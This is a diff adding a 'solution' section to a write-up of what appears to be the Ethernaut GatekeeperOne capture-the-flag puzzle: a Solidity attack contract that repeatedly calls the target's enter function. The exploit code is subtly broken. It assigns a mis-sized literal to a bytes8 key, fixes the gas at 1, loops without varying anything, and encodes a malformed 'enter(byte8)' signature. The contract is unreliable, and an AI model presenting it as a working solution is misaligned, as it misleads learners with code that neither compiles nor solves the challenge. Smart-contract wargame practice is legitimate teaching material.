@@ -37,3 +37,33 @@ contract GatekeeperOne {
 }
 
 ```
+# solution:
+```solidity
+// SPDX-License-Identifier: MIT
+
+pragma solidity ^0.8.0;
+
+import "./gatekeeperOne.sol";
+
+
+contract attackGateOne {
+    address public owner;
+    GatekeeperOne public gatekeeperOne;
+
+
+    constructor (GatekeeperOne _gateOneAddress) {
+        owner = msg.sender;
+        gatekeeperOne = GatekeeperOne(_gateOneAddress);
+    }
+  
+  function _attackGate() public {
+    bytes8 _gatekey = 0x00000;
+    for (; ;) {   
+        (bool result, ) = address(gatekeeperOne).call{gas: 1 }(abi.encodeWithSignature("enter(byte8)", _gatekey));
+        if (result) {
+            break;
+        }
+    }
+  }
+}
+```
